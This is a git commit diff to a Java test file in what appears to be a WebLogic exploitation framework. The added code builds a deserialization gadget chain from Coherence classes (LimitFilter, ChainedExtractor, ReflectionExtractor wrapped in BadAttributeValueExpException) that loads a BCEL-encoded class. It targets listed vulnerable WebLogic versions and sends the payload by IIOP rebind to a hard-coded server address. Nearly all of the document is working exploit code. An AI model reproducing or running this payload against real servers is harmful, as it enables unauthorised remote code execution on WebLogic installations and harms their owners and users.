e6c31290633a7d9edec76eea797ab4a4385f488a
R4v3zn <woo0nise@gmail.com>
2020-04-22 11:11:05 +0800

    添加Base_类

--- src/main/java/com/weblogic/framework/Test.java
+++ src/main/java/com/weblogic/framework/Test.java
@@ -15,12 +15,25 @@
 
 package com.weblogic.framework;
 import com.sun.org.apache.bcel.internal.classfile.Utility;
-//import com.sun.org.apache.bcel.internal.util.ClassLoader;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+import com.weblogic.framework.entity.ContextPojo;
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.mozilla.classfile.DefiningClassLoader;
 import weblogic.cluster.singleton.ClusterMasterRemote;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.Serializable;
+import java.lang.reflect.Array;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.rmi.Remote;
 import static com.weblogic.framework.utils.CallUtils.CALL_MAP;
+import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
+import static com.weblogic.framework.utils.ContextUtils.rebind;
+import static com.weblogic.framework.utils.StringUtils.getRandomString;
+import static org.apache.commons.lang3.StringUtils.isBlank;
 
 /**
  * Title: Test
@@ -34,6 +47,16 @@ import static com.weblogic.framework.utils.CallUtils.CALL_MAP;
  */
 public class Test {
 
+    /**
+     * 漏洞利用 jar 文件名称
+     */
+    public static final String[] VUL_DEPENDENCIES = new String[]{"coherence.jar"};
+
+    /**
+     * 漏洞影响版本
+     */
+    public static final String[] VUL_VERSIONS = new String[]{"12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};
+
     public static void main(String[] args) throws Exception {
         String callName = ClusterMasterRemote.class.getSimpleName();
         Class<? extends Remote> callClazz = CALL_MAP.get(callName);
@@ -45,18 +68,77 @@ public class Test {
         ctClass.setName(callClazz.getSimpleName());
         byte[] bytes = ctClass.toBytecode();
         String result = Utility.encode(bytes, true);
+        result = "$$BCEL$$"+result;
         System.out.println(result);
-//        result = "$$BCEL$$"+result;
+
+        URLClassLoader urlClassLoader = loadJar("12.2.1.3.0",VUL_DEPENDENCIES);
+
+        String bindName = getRandomString(16);
+        Object sendObject = getObject(null, new String[]{bindName,""}, result,urlClassLoader);
+
+        ContextPojo contextPojo = rebind("iiop://10.10.10.162:7001", sendObject, urlClassLoader);
+
+//        com.sun.org.apache.bcel.internal.util.ClassLoader.class.newInstance().loadClass(result);
 //        Class clazz = Class.forName(result,true, new ClassLoader());
 //        ClassLoader classLoader = new ClassLoader();
-//        Class.forName("")
-//        LimitFilter.main();
-
-//        Thread.currentThread().setContextClassLoader(new ClassLoader());
-////        Class clazz1 = classLoader.getParent().loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
+//        Class clazz1 = classLoader.getParent().loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
 //        Class clazz1 = classLoader.loadClass("weblogic.cluster.singleton.ClusterMasterRemote");
-//        Class clazz = classLoader.loadClass("$$BCEL$$"+result);
-        // $$BCEL$$$
+//        Class clazz = classLoader.loadClass("weblogic.cluster.singleton.ClusterMasterRemote"+"$$BCEL$$"+result);
+//         $$BCEL$$$
 //        System.out.println(clazz.getName());
+    }
+
+    /**
+     * 获取序列化 payload
+     * @param codeByte 需要序列化的字节码
+     * @param bootArgs 执行中参数,0位传入执行class命令,1位传入DefiningClassLoader url
+     * @param className 反射的 class name
+     * @return 序列结果
+     * @throws Exception
+     */
+    public static Serializable getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
+        String classPath = bootArgs[1];
+        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
+        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
+        Class clazz = null;
+        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
+//        DefiningClassLoader.class.newInstance().defineClass()
+        Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
+        Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
+                new Object[]{className});
+        Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
+        Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
+                new Object[]{bootArgs[0]});
+        Array.set(valueExtractor, 0, javascriptNewInstance);
+        Array.set(valueExtractor, 1, defineClass);
+        Array.set(valueExtractor, 2, defineClassNewInstance);
+        Array.set(valueExtractor, 3, rmiBind);
+        clazz = ClassLoader.class;
+        return getObject(valueExtractor, clazz, urlClassLoader);
+    }
+
+    /**
+     * 获取序列化 payload
+     * @param valueExtractors ValueExtractors
+     * @param clazz 反序列化的 class
+     * @return 序列结果
+     * @throws Exception
+     */
+    private static Serializable getObject(final Object valueExtractors, Class clazz, URLClassLoader urlClassLoader) throws Exception {
+        Class limitFilterClazz = urlClassLoader.loadClass("com.tangosol.util.filter.LimitFilter");
+        Class chainedExtractorClazz  = urlClassLoader.loadClass("com.tangosol.util.extractor.ChainedExtractor");
+        Object limitFilter = limitFilterClazz.newInstance();
+        Field m_comparator = limitFilterClazz.getDeclaredField("m_comparator");
+        m_comparator.setAccessible(true);
+        Object chainedExtractor = chainedExtractorClazz.getConstructor(valueExtractors.getClass()).newInstance(valueExtractors);
+        m_comparator.set(limitFilter, chainedExtractor);
+        Field m_oAnchorTop = limitFilterClazz.getDeclaredField("m_oAnchorTop");
+        m_oAnchorTop.setAccessible(true);
+        m_oAnchorTop.set(limitFilter, clazz);
+        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
+        Field val = expException.getClass().getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(expException, limitFilter);
+        return expException;
     }
 }
